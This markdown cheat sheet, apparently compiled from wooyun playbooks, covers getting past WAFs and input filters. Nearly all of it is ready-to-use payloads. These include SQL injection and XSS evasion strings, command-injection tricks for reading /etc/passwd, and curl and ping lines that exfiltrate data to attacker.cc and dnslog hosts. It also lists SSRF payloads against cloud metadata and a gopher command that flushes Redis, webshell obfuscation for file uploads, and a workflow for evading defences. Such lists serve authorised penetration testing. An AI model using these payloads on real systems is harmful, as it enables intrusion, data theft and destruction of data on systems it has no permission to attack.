# General Bypass Toolkit

> Synthesized and rewritten from `core/bypass_strategies.md` + the bypass sections of various wooyun playbooks
> Perspective: black-box, blocked by a WAF / filter / business validation — how to keep going

---

## 1. The essence of bypassing

```
Bypass = parsing discrepancy + boundary corner case + protection blind spot

Every time you're blocked, ask yourself:
  Q1. Do the protection component and the backend parse consistently? (front WAF vs Tomcat, CDN vs origin)
  Q2. Does the protection cover all corner cases? (double encoding, mixed case, length overflow)
  Q3. Does the protection cover all entry points? (Header, Cookie, HPP, other verbs)
```

General decision tree:

```
Payload blocked
 ├─ Is the response from the WAF? the app? or the origin?
 │   ├─ WAF block → protocol-layer bypass (HPP / Chunked / case / Content-Type)
 │   └─ App block → encoding layer / semantic layer (double-write, comments, equivalent functions)
 ├─ Is it a blacklist or a whitelist?
 │   ├─ Blacklist → find the missed keyword / synonym
 │   └─ Whitelist → find a dangerous usage the whitelist allows
 └─ Is it input filtering or output encoding?
     ├─ Input filtering → multi-encoding / second-order injection
     └─ Output encoding → context escape (HTML→JS, URL→JS)
```

---

## 2. SQLi bypass table (by dimension)

### 2.1 Keyword filtering
| Technique | Payload | Applicable when |
|------|---------|------|
| Case mixing | `UnIoN SeLeCt` | Blacklist detects pure lowercase |
| Double-write | `UNunionION SELselectECT` | Single-replacement filter |
| Comment insertion | `un/**/ion sel/**/ect` | Whitespace filtering |
| MySQL inline comment | `/*!50000union*//*!50000select*/` | Classic WooYun case |
| Synonyms | `\|\|` for `OR`, `&&` for `AND` | Keyword OR/AND filtering |
| Equality replacement | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` | `=` filtering |
| Function equivalents | `mid()`/`substr()`/`substring()`/`left()` | Substring function filtering |

### 2.2 Space filtering
```
/**/   %09(Tab)   %0a(LF)   %0d(CR)   %0b   %0c
Parenthesis nesting: select(user)from(dual)
Backticks (MySQL): `select`user`from`
Plus sign (URL parameter position): select+user+from
```

### 2.3 Quote bypass
```
0x61646D696E              (hex, 'admin')
char(97,100,109,105,110)
%df%27                    (GBK wide byte)
```

### 2.4 Numeric injection (no quotes needed)
```
id=1 AND 1=1
id=1 AND sleep(5)
id=1 AND IF(SUBSTRING(user(),1,1)='r',sleep(5),0)
```

### 2.5 Double-layer delay for time-based blind (bypass the sleep keyword)
```
id=(select(2)from(select(sleep(8)))v)        # WooYun-2015-0114228
id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))
id=1 AND dbms_pipe.receive_message('a',5)=1   # Oracle
id=1; WAITFOR DELAY '0:0:5'--                 # MSSQL
```

---

## 3. XSS bypass table

### 3.1 Tag filtering
```
<ScRiPt>   <script/x>   <script\n>   <script\t>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### 3.2 Event handler library (by rarity, further down hits WAFs better)
```
onerror onload onclick onmouseover                  # already catalogued by most WAFs
onfocus onblur oninput onchange autofocus           # medium
onanimationend ontransitionend ontoggle ontouchstart
onpointerenter oncanplay onauxclick onbeforeprint   # rare
```

### 3.3 Keyword / parenthesis bypass
```
alert(1)                # Unicode
eval('al'+'ert(1)')          # concatenation
Function('alert(1)')()       # constructor
window['al'+'ert'](1)
String.fromCharCode(97,108,101,114,116,40,49,41)
alert`1`                     # template string bypasses parens
throw onerror=alert,1
location='javascript:alert(1)'
```

### 3.4 Encoding layer (by context)
| Context | Encoding | Example |
|--------|------|------|
| HTML | Entities | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| HTML | Hex entities | `&#x3c;script&#x3e;` |
| JS string | Unicode | `<iframe/onload=alert(1)>` |
| URL | data: + base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| CSS (IE) | Hex | `xss:\65\78\70\72\65\73\73\69\6f\6e(1)` |

### 3.5 Context escape quick table
| Output position | Break out via | Payload |
|---------|------|---------|
| `<div>HERE</div>` | Tag | `<svg onload=alert(1)>` |
| `<input value="HERE">` | Quote | `" autofocus onfocus=alert(1) "` |
| `<a href="HERE">` | Protocol | `javascript:alert(1)` |
| `<script>var x="HERE"</script>` | Quote | `";alert(1);//` |
| `<script>var x={"k":"HERE"}</script>` | JSON | `'-alert(1)-'` or `"};alert(1);//` |

---

## 4. Command injection bypass table

### 4.1 Concatenation operators
```
Linux:    ;   |   ||   &&   &   `cmd`   $(cmd)   %0a(LF)
Windows:  &   |   ||   &&   %0a
```

### 4.2 Space bypass
```
${IFS}        cat${IFS}/etc/passwd
${IFS}$9      cat${IFS}$9/etc/passwd
%09(Tab)      cat%09/etc/passwd
{a,b}         {cat,/etc/passwd}
Redirection   cat</etc/passwd
```

### 4.3 Keyword bypass
```
c'a't  c"a"t  c\at         # quote / backslash splitting
a=ca;b=t;$a$b /etc/passwd  # variable concatenation
/bin/c?t /etc/passwd       # wildcard
/???/??t /etc/p??s??       # full wildcard
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh    # base64 nesting
```

### 4.4 cat substitutes (when the command keyword is filtered)
```
tac head tail more less nl sort uniq od xxd base64 rev paste strings
# all can read out file contents
```

### 4.5 Blind exfiltration
```bash
# DNSLog
ping `whoami`.xxx.dnslog.cn
curl `cat /etc/passwd | base64 | tr -d '\n'`.xxx.dnslog.cn

# HTTP exfiltration
curl https://attacker.cc/?d=`whoami`
curl -X POST -d "$(cat /etc/passwd | base64)" https://attacker.cc/

# Time-based exfiltration (blind)
if [ `id -u` -eq 0 ]; then sleep 5; fi
```

---

## 5. Path traversal / file-read bypass table

### 5.1 Encoding gradient
```
../        →  %2e%2e%2f
../        →  %252e%252e%252f      (double URL)
../        →  ..%c0%af / ..%c1%9c   (overlong UTF-8, old Tomcat / GlassFish)
../        →  %u002e%u002e%u2215    (IIS / old Java)
../        →  ....// / ..../        (filter removes once, original prototype remains)
```

### 5.2 Truncation / protocol
```
%00              ../../../etc/passwd%00.jpg     # PHP <5.3.4 / old Java
;                /admin;.jpg                    # IIS / Tomcat
file://          file:///etc/passwd
view-source:     view-source:file:///etc/passwd
php://filter     php://filter/convert.base64-encode/resource=index.php
```

### 5.3 Directory springboards
```
/.            //          /./           /../         /;/
/static/../config         /assets/..%2fapp/config.yml
```

---

## 6. SSRF bypass table

### 6.1 IP notations
```
http://127.0.0.1
http://2130706433             # decimal
http://0177.0.0.1             # octal
http://0x7f.0x0.0x0.0x1       # hex
http://127.1                  # shorthand
http://[::1]                  # IPv6
http://[::ffff:127.0.0.1]
```

### 6.2 Domain bypass
```
http://127.0.0.1.nip.io       # public-resolver loopback
http://localtest.me           # same as above
http://attacker.com#@127.0.0.1
http://attacker.com\@127.0.0.1
http://attacker.com&@127.0.0.1
DNS Rebinding                 # first query returns external, second returns internal (rbndr.us, tartarsauce.org)
```

### 6.3 Protocols
```
file://     file:///etc/passwd
gopher://   gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
dict://     dict://127.0.0.1:6379/info
ldap://     ldap://attacker.com/
ftp://      ftp://attacker.com/
```

### 6.4 Cloud metadata (must try)
```
AWS         http://169.254.169.254/latest/meta-data/
AWS-IMDSv2  curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token
GCP         http://metadata.google.internal/computeMetadata/v1/    Header: Metadata-Flavor: Google
Azure       http://169.254.169.254/metadata/instance?api-version=2021-02-01    Header: Metadata: true
Alibaba Cloud   http://100.100.100.200/latest/meta-data/
Tencent Cloud   http://metadata.tencentyun.com/latest/meta-data/
```

---

## 7. General WAF bypass

### 7.1 Protocol layer
| Technique | Description |
|------|------|
| HPP (HTTP Parameter Pollution) | `?id=1&id=2' OR 1=1--`, front/back ends pick different parameters |
| Chunked Transfer-Encoding | `Transfer-Encoding: chunked` hides the full body from the WAF |
| Content-Type confusion | multipart boundary confusion / change to `application/xml` so the WAF doesn't parse |
| HTTP method override | `X-HTTP-Method-Override: PUT`, `_method=DELETE` |
| HTTP/2 vs HTTP/1 conversion discrepancy | See `playbooks/http-smuggling.md` |
| Case-varied Header | `cONTENT-tYPE` — some WAFs don't recognize it |

### 7.2 Encoding layer
```
1. Multi-encoding: URL → HTML entity → Unicode triple-nesting
2. Character sets: GBK wide byte / UTF-7 / UTF-16
3. Content-Encoding: gzip-compress the body
```

### 7.3 Length / splitting
```
1. Oversized parameters (exceeding the WAF detection window, commonly 8KB / 16KB)
2. Multi-parameter combination: part1=SEL part2=ECT
3. Second-order injection: store into the DB first, then trigger
4. Uncommon entry points: Cookie / Referer / X-Forwarded-For / User-Agent
```

---

## 8. File upload bypass table

| Detection layer | Bypass |
|--------|------|
| Client-side JS | Disable JS / intercept the response in Burp |
| Extension blacklist | `.Php`, `.pHp`, `.php3/.php5/.phtml/.phar`, `.PHP%20`, `.php.` |
| Extension whitelist | `%00` truncation (old PHP/Java), `shell.jpg/.php` (Nginx fix_pathinfo), `shell.asp;.jpg` (IIS6), `.jspx` |
| Content-Type | Change to `image/jpeg`, `image/gif` |
| File header | Prepend `GIF89a\n<?php ...?>` or `\x89PNG...` |
| Static content signature | Variable functions `$a='ass'.'ert'; $a($_POST['x']);`, `array_map('assert',$_POST)` |
| Re-rendering | Place the payload in EXIF, IDAT chunks — still readable after rendering |
| Path bypass | `filename=../../web/shell.php`, old ZipSlip |
| Parsing config | Apache multi-suffix `.php.xxx` right-to-left, Nginx `/x.jpg/.php` |

---

## 9. Uploaded-file access path not returned?

```
1. Capture the packet and check if the response contains the full URL
2. Check the preview feature (many CMSes can preview after upload)
3. Check the upload timestamp naming rule (`20140829221136jsp.jsp` pattern → time brute-force ±60s)
4. The editor's built-in browse feature (FCKeditor /connectors/...?Command=GetFoldersAndFiles&CurrentFolder=/../)
5. Combine with arbitrary file read / .git leak to deduce the directory
```

---

## 10. Corner Case quick checklist

Run through this table before firing each new payload:

- [ ] Double URL encoding (`%252e`)
- [ ] Unicode variants (`%u0027`, `'`)
- [ ] Wide byte (GBK, `%df%27`)
- [ ] Overlong UTF-8 (`%c0%ae` = `.`)
- [ ] Mixed encoding (partly encoded + partly plaintext)
- [ ] Comment nesting (`/*!50000select*/`)
- [ ] Scientific notation / float (`1e0union`, `1.0union`)
- [ ] Negative / zero (`-1 UNION`, `0 OR`)
- [ ] Tab / form feed (`\t \v \f \r`)
- [ ] HPP (duplicate parameters)
- [ ] Chunked / Content-Encoding gzip
- [ ] Duplicate Headers (duplicate Host, duplicate CL)
- [ ] Path normalization discrepancy (`//`, `/./`, `/;param`, trailing slash)
- [ ] Duplicate JSON keys (first-wins / last-wins)
- [ ] XML DTD (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`)

---

## 11. Practical workflow (what to do when blocked)

```
1. First confirm who blocked it
   → Check response headers: Server / X-WAF / error-page signatures / status code (403 / 406 / 418)
   → Send a plain string on the same parameter and see if it passes; if only malicious payloads trigger it, it's a WAF

2. Identify the WAF
   → wafw00f https://target
   → Look for common signatures: Cloudflare (cf-ray), ModSecurity, AWS WAF, Alibaba Cloud Shield, Chaitin SafeLine

3. Pick the first bypass:
   → Encoding layer (cheapest): URL double-encoding → Unicode → entities
   → Semantic layer: equivalent functions / comments / case
   → Protocol layer: HPP / Chunked / change method / change Content-Type

4. First one fails:
   → Split the payload (multi-parameter combination / oversized prefix padding / Cookie smuggling)
   → Switch entry points (Header → Cookie → JSON body → multipart)

5. Still failing:
   → Second-order injection (store first, trigger later)
   → Switch targets (if SaaS multi-tenant, change tenant domain / subdomain)
   → Note "protection effective," move on to the next endpoint
```
